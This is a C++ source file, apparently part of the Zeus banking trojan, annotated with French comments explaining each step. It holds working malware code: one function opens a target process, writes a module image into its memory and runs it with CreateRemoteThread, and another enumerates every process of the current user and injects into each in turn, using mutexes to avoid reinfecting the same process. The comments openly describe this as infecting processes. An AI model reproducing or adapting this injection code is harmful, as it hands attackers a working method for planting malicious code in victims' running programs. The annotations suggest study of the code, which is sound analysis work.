#include <windows.h>
#include <tlhelp32.h> //ToolHelp32 permet de prendre un snapshot des processus
#include <wininet.h> //API qui permet à d'accéder à internet avec notamment HTTP, FTP ...
 
#include "defines.h"
#include "MainCore.h"
#include "MainInject.h"
 
#include "..\common\debug.h"
#include "..\common\process.h"
 
extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C', 'O', 'N', 'F', 'I', 'G'};
 
 
static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
{
  bool ok = false;
// teste d’avoir accès au processus pid (à partir de kernel32, processus système) avec ces droits, (test de vulnérabilité)
  HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION |    
                                              PROCESS_VM_OPERATION |
                                              PROCESS_VM_WRITE |
                                              PROCESS_VM_READ |
                                              PROCESS_CREATE_THREAD |
                                              PROCESS_DUP_HANDLE,
                                              FALSE, pid);
 // si on réussit  à avoir accès
  if(process != NULL)
  {
void *newImage = MainCore::initNewModule(process, processMutex, proccessFlags); // créer une image de pid
    if(newImage != NULL)
    {
      LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)MainCore::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));
// create a thread that runs in the virtual address space of kernel 32, genre ça copie le processus précédent ?
      HANDLE thread = CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);
 
      if(thread != NULL)
      {
        WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", newImage, thread);
        // attend 10 sec, si pas reussi a créer le remote thread alors pb
if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
        {
          WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", newImage, thread);
        }
// ferme l’open object
        CWA(kernel32, CloseHandle)(thread);
        ok = true; // on a réussi à infecter le processus pid 
      }
      else // si thread = NULL
      {
        WDEBUG1(WDDT_ERROR, "Failed to create remote thread in process with id=%u.", pid); // relache la memoire 
        CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
      }
    }
#   if(BO_DEBUG > 0)
    // si (newImage = NULL)
    else WDEBUG1(WDDT_ERROR, "Failed to alloc code in process with id=%u.", pid);
#   endif
 // ferme l’open object
    CWA(kernel32, CloseHandle)(process);
  }
#if(BO_DEBUG > 0)
// si process = NULL
  else WDEBUG1(WDDT_ERROR, "Failed to open process with id=%u.", pid);
#endif
  return ok;
}
 
static bool InjectMalware(void)
{
}
 
void MainInject::init(void)
{
 
}
 
void MainInject::uninit(void)
{
 
}
 
bool MainInject::_injectToAll(void)
{
  bool ok = false;
 
  WDEBUG0(WDDT_INFO, "Listing processes...");   
 
  LPDWORD injectedPids    = NULL; //pointeur to a DWORD -- tableau qui contiendra les pid des processus
  DWORD injectedPidsCount = 0; //mot de 32 bits
  DWORD newProcesses; //mot de 32 bits
 
  do
  {
    HANDLE snap = CWA(kernel32, createToolhelp32Snapshot) (TH32CS_SNAPPROCESS, 0); //CreateToolhelp32Snapshot avec cet argument, prend un snapshot de TOUS les processus du systeme. Handle est l'indice   référencant la structure retournée par l'API windows

    newProcesses = 0; //creer un processus bidon
 
    if(snap != INVALID_HANDLE_VALUE) //Si la structure accessible par le HANDLE snap est valide
    {
      PROCESSENTRY32W pe; //structure qui décrit l'entrée de la liste des processus
      pe.dwSize = sizeof(PROCESSENTRY32W); //initialisation de la taille de la structure
 
      if(CWA(kernel32, Process32FirstW)(snap, &pe))do //Process32FirstW permet de récupérer les informatios sur le premier processus dans la liste. Ces informations sont enregistrés dans pe
      {
        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid) //si pid du processes est valide et TODO
        {
          TOKEN_USER *tu; //structure qui identifie un utilisateur associé à son token (qui l'identifie, identifie son groupe et ses privilèges)
          DWORD sessionId; //id de l'utilisateur du processus
          DWORD sidLength;

          for(DWORD i = 0; i < injectedPidsCount; i++) if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT; // si le process a deja été infecté, on saute à SKIP_INJECT

 	  // Le mutex permet d'éviter d'infecté le processus plus d'une fois
          HANDLE mutexOfProcess = MainCore::createMutexOfProcess(pe.th32ProcessID); //Definit un objet mutex sur le processus
          if(mutexOfProcess == NULL) goto SKIP_INJECT; //si le mutex vaut NULL, c'est quand mutex à déja était créé sur ce processus, et docn qu'il a déja était infecté
 
          if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)//Recupere l'utilisateur lié au processus.
          {

            //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
	    //si l’utilisateur est l'utilisateur courant et que tous les octets sont les memes (meme identifiant de securiter (sid)...)
            if(sessionId == coreData.currentUser.sessionId &&
               (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
               Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
            {

	      //resize la structure avc une taille plus grande (taille actuelle + 1 DWORD)
              if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
              {
	        // enregistre le pid du process dans la liste des pid des processus qui sont infectés
                injectedPids[injectedPidsCount++] = pe.th32ProcessID;
                newProcesses++;
 
                WDEBUG1(WDDT_INFO, "pe.th32ProcessID=%u", pe.th32ProcessID);
 		// Appel la fonction pour infecter le processus avec le pid pe.th32ProcessID
                if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0)) ok = true; //ok = true si l'infection s'est bien passée
              }

#             if(BO_DEBUG > 0)
              else WDEBUG0(WDDT_ERROR, "Failed to realloc injectedPids.");
#             endif
            }
            Mem::free(tu); //libere le token user
          }
 
          CWA(kernel32, CloseHandle)(mutexOfProcess); //ferme l'objet HANDLE (référence sur l'object mutex créé sur le processus)
 
SKIP_INJECT:; // FLAG de destination pour le "goto SKIP_INJECT"
        }
      }
      while(CWA(kernel32, Process32NextW)(snap, &pe)); //tant qu'il y reste d'autres processus dans la liste du snap
 
      CWA(kernel32, CloseHandle)(snap);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_ERROR, "Failed to list processes.");
#   endif
  }
  while(newProcesses != 0); //tant qu'au moins 1 processus a été récupéré et infecté
 
  Mem::free(injectedPids); //libère l'espace mémoire du tableau
 
  return ok;
}

